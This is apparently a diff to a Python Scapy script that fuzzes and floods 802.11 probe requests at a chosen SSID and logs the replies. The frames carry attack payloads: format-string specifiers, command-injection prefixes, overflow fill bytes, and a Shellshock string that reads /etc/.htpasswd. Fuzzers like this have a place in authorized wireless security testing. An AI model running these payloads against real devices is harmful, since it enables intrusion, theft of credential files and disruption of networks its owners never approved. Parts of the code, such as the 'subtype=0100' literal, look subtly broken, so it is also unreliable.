@@ -23,20 +23,20 @@ targets = raw_input("SSID> ")
 
 def engine():
   for i in range(1,256):
-    
 
-    fmts   = ["%s"*i,"AAA%08$x","AAA%08%h","AAA%08$s","AAA%08$n","%s"*i,"AAA%080$u"]
-    rc      = ["set","'set",":set","|set","$set"]
-    io = [str(i)*i] 
+    fmts   = ["%s"*i, "AAA%08$x", "AAA%08%h", "AAA%08$s", "AAA%08$n", "%s"*i, "AAA%080$u"]
+    rc     = ["set", "'set", ":set", "|set","$set"]
+    io     = [str(1)*i] 
     bonull = ["00"*i]
     bofull = ["FF"*i]
     sshock = ["env x='() { :;}; echo vulnerable' bash -c cat /etc/.htpasswd"]
-    exploits = [fmts,rc,io bonull,bofull,sshock]
+    exploits = [fmts, rc, io, bonull, bofull, sshock]
     for x in exploits[:]:
       tofuzz = [
-        "Dot11Elt(ID="+str(x)+",info='00')", 
-        "Dot11Elt(ID='SSID', len="+str(x)+",info='00')", 
-        "Dot11Elt(ID='SSID', len=9,info="+str(x)+")", 
+        "Dot11Elt(ID="+str(x)+", info='00')", 
+        "Dot11Elt(ID='SSID', len="+str(x)+", info='00')", 
+        "Dot11Elt(ID='SSID', len=64, info="+str(x)+")", 
+        "Dot11Elt(ID='SSID', len=9, info="+str(x)+")", 
         "Dot11Elt(ID='RATES', info="+str(x)+")", 
         "Dot11Elt(ID='EXT RATES ',info="+str(x)+")",  
         "Dot11Elt(ID='DS PARAM', info="+str(x)+")",  
@@ -56,25 +56,23 @@ def engine():
         "Dot11Elt(ID='COUNTRY BAND TRIPLET',info="+str(x)+")", 
         "Dot11Elt(ID='COUNTRY EXT TRIPLET',info="+str(x)+")"]
       for a in tofuzz[:]:
-        resp = srp(
+        resp = srpflood(
           RadioTap()/
           Dot11(type=0,subtype=0100,addr2=targets)/
-          Dot11ProbeReq()/
-          a,timeout=4)
+          Dot11ProbeReq()/a)
 
 #Threads
 
 def getresp(p):
-  logfile = open("wifiprobe.txt","a")
+  logfile = open("log.txt","a")
   dframe = (4,5)
   if p.haslayer(Dot11):
-    if p.addr1 == targets:
       if p.type == 0 and p.subtype in dframe:
-        logfile.write(hexdump(p)+"/n/n")
-        print(hexdump(p)+"/n/n")
+        d = str(p)
+        logfile.write(str(d)+"\n")
+        print(hexdump(d))
 
 t = threading.Thread(target = engine)
 t.start()
-while True:
-  logfile = open("wifiprobe.txt","a")
-  sniff(prn=getresp, count=1)
+
+sniff(prn=getresp)
